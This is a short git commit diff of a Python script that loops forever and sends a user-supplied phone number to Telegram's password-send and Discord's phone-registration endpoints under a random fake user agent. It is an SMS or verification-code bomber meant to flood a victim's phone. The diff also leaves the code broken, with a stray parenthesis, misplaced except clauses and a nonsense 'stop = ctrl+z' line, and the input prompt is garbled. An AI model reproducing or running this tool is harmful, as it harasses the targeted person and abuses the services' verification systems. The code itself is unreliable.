8186288f5b1e7097f9b46c2f751c9dbe8f93453c
Hironotori <81866681+Hironotori@users.noreply.github.com>
2022-01-24 12:15:35 +0200

    Add files via upload

--- qq.py
+++ qq.py
@@ -1,23 +1,21 @@
 import requests, fake_useragent, time
 
 user = fake_useragent.UserAgent().random
-headers = {'user_agent' : user}
-stop = input ('ля стопа')
+headers = {'user_agent' : user})
 NUMBER = input('Beeante HOMep tenedona: (6es +)')
 
  
 while True:
-
  try:
      print('+')
      response = requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone': "+" + NUMBER})
- except:
      print('=')
+ except:
  try:
      print('+')
      response = requests.post('https://discord.com/api/v9/auth/register/phone', headers=headers, json={'phone': "+" + NUMBER})
- except:
      print('=')
+ except:
 	 
 stop = ctrl+z
 time.sleep(5000)
